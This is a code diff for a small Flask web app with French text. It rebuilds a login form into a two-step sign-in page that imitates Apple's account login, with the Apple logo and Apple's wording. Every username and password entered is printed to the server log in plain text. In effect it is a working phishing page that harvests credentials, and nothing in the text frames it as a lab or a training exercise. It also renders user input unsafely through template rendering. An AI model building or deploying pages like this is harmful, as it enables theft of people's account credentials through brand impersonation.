@@ -1,135 +1,217 @@
-from flask import Flask, request, render_template_string
+from flask import Flask, request, render_template_string, redirect, url_for
 
 app = Flask(__name__)
 
-step1_form = """
+# Données de session simulées (en production, utiliser Flask-Session)
+app.secret_key = 'votre_cle_secrete_ici'  # Nécessaire pour les sessions
+
+# Configuration pour les identifiants valides
+VALID_CREDENTIALS = {
+    'username': 'youva',
+    'password': '1234'
+}
+
+base_html = """
 <!DOCTYPE html>
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>Connexion - Étape 1</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Compte Apple</title>
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+        body {{
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f5f5f7;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            background-color: #fff;
-        }
-        .container {
-            width: 90%;
-            max-width: 400px;
-        }
-        .input-box {
-            display: flex;
-            border: 1px solid #ccc;
-            border-radius: 24px;
-            overflow: hidden;
-        }
-        input[type="text"] {
-            flex: 1;
-            border: none;
-            padding: 16px;
+            margin: 0;
+            padding: 0;
+        }}
+        .login-container {{
+            width: 380px;
+            padding: 40px;
+            background-color: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }}
+        .apple-logo {{
+            width: 44px;
+            height: 44px;
+            margin-bottom: 20px;
+        }}
+        h1 {{
+            font-size: 24px;
+            font-weight: 600;
+            margin: 0 0 20px 0;
+            color: #1d1d1f;
+        }}
+        .input-container {{
+            position: relative;
+            margin-bottom: 15px;
+        }}
+        .input-field {{
+            width: 100%;
+            padding: 15px 45px 15px 15px;
             font-size: 16px;
+            border: 1px solid #d2d2d7;
+            border-radius: 8px;
+            box-sizing: border-box;
+        }}
+        .input-field:focus {{
+            border-color: #0071e3;
             outline: none;
-        }
-        button {
-            background-color: transparent;
+        }}
+        .submit-btn {{
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
             border: none;
-            padding: 0 20px;
-            cursor: pointer;
+            color: #0071e3;
             font-size: 18px;
-        }
+            font-weight: bold;
+            cursor: pointer;
+            padding: 0 5px;
+        }}
+        .checkbox-container {{
+            text-align: left;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #1d1d1f;
+        }}
+        .link {{
+            display: block;
+            color: #0071e3;
+            text-decoration: none;
+            font-size: 14px;
+            margin: 10px 0;
+        }}
+        .link:hover {{
+            text-decoration: underline;
+        }}
+        .error-message {{
+            color: #ff3b30;
+            font-size: 13px;
+            margin: -10px 0 15px 0;
+            text-align: left;
+        }}
+        .username-display {{
+            text-align: left;
+            font-size: 14px;
+            color: #1d1d1f;
+            margin-bottom: 15px;
+        }}
     </style>
 </head>
 <body>
-    <div class="container">
-        <form method="POST">
-            <div class="input-box">
-                <input type="text" name="username" placeholder="Courriel ou numéro de téléphone" required>
-                <button type="submit">→</button>
-            </div>
-        </form>
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" 
+             alt="Apple Logo" class="apple-logo">
+        <h1>Se connecter avec un compte Apple</h1>
+        {content}
     </div>
 </body>
 </html>
 """
 
-step2_form = """
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-    <meta charset="UTF-8">
-    <title>Connexion - Étape 2</title>
-    <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #fff;
-        }
-        .container {
-            width: 90%;
-            max-width: 400px;
-            text-align: center;
-        }
-        h3 {
-            margin-bottom: 20px;
-        }
-        input[type="password"] {
-            width: 100%;
-            padding: 16px;
-            font-size: 16px;
-            border-radius: 8px;
-            border: 1px solid #ccc;
-            margin-bottom: 20px;
-        }
-        button {
-            width: 100%;
-            padding: 14px;
-            font-size: 16px;
-            background-color: #0071e3;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h3>{{ username }}</h3>
-        <form method="POST">
-            <input type="hidden" name="username" value="{{ username }}">
-            <input type="password" name="password" placeholder="Mot de passe" required><br>
-            <button type="submit">Se connecter</button>
-        </form>
+username_screen = """
+<form method="POST" action="/username">
+    <div class="input-container">
+        <input type="text" name="username" class="input-field" placeholder="Courriel ou numéro de téléphone" required>
+        <button type="submit" class="submit-btn">→</button>
     </div>
-</body>
-</html>
+    <div class="checkbox-container">
+        <input type="checkbox" id="stay_connected" name="stay_connected">
+        <label for="stay_connected">Rester connecté</label>
+    </div>
+    <a href="#" class="link">Mot de passe oublié? 🟧</a>
+    <a href="#" class="link">Créer un compte Apple</a>
+</form>
+"""
+
+password_screen = """
+<div class="username-display">Courriel ou numéro de téléphone<br>{username}</div>
+<form method="POST" action="/password">
+    <div class="input-container">
+        <input type="password" name="password" class="input-field" placeholder="Mot de passe" required>
+        <button type="submit" class="submit-btn">→</button>
+    </div>
+    <div class="checkbox-container">
+        <input type="checkbox" id="stay_connected" name="stay_connected">
+        <label for="stay_connected">Rester connecté</label>
+    </div>
+    <a href="#" class="link">Mot de passe oublié? 🟧</a>
+    <a href="#" class="link">Créer un compte Apple</a>
+</form>
+"""
+
+error_screen = """
+<form method="POST" action="/username">
+    <div class="input-container">
+        <input type="text" name="username" class="input-field" placeholder="Courriel ou numéro de téléphone" value="{username}" required>
+        <button type="submit" class="submit-btn">→</button>
+    </div>
+    <div class="error-message">
+        <strong>Mot de passe</strong><br>
+        Vérifiez les informations de compte que vous avez entrées et réessayez.
+    </div>
+    <div class="checkbox-container">
+        <input type="checkbox" id="stay_connected" name="stay_connected">
+        <label for="stay_connected">Rester connecté</label>
+    </div>
+    <a href="#" class="link">Mot de passe oublié?</a>
+    <a href="#" class="link">Créer un compte Apple</a>
+</form>
+"""
+
+success_screen = """
+<div style="padding: 20px; text-align: center;">
+    <h2 style="color: #1d1d1f;">Connexion réussie</h2>
+    <p style="color: #86868b;">Bienvenue, {username}!</p>
+</div>
 """
 
 @app.route("/", methods=["GET", "POST"])
-def login():
+def home():
     if request.method == "POST":
-        # RÉCUPÉRATION CÔTÉ SERVEUR
-        username = request.form["username"]
-        password = request.form["password"]
+        username = request.form.get("username", "").strip()
+        return redirect(url_for("handle_username", username=username))
+    
+    return render_template_string(base_html.format(content=username_screen))
 
-        # Tu peux maintenant utiliser ces valeurs comme tu veux :
-        print(f"Nom d'utilisateur reçu : {username}")
-        print(f"Mot de passe reçu : {password}")
+@app.route("/username", methods=["GET", "POST"])
+def handle_username():
+    if request.method == "POST":
+        username = request.form.get("username", "").strip()
+        return render_template_string(base_html.format(
+            content=password_screen.format(username=username)
+        ))
+    
+    return redirect(url_for("home"))
 
-        # Par exemple, vérification basique :
-        if username == "admin" and password == "1234":
-            return f"<h3>Bienvenue, {username} !</h3>"
-        else:
-            return "<h3>Identifiants incorrects</h3>"
-
-    return render_template_string(login_form)
+@app.route("/password", methods=["POST"])
+def handle_password():
+    username = request.form.get("username", "").strip()
+    password = request.form.get("password", "").strip()
+    
+    # Enregistrement côté serveur (simulé)
+    print(f"\n[LOG] Tentative de connexion reçue:")
+    print(f"Username: {username}")
+    print(f"Password: {password}\n")
+    
+    # Validation des identifiants
+    if username == VALID_CREDENTIALS['username'] and password == VALID_CREDENTIALS['password']:
+        return render_template_string(base_html.format(
+            content=success_screen.format(username=username)
+        ))
+    else:
+        return render_template_string(base_html.format(
+            content=error_screen.format(username=username)
+        ))
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=8000)
+    app.run(host="0.0.0.0", port=8000, debug=True)
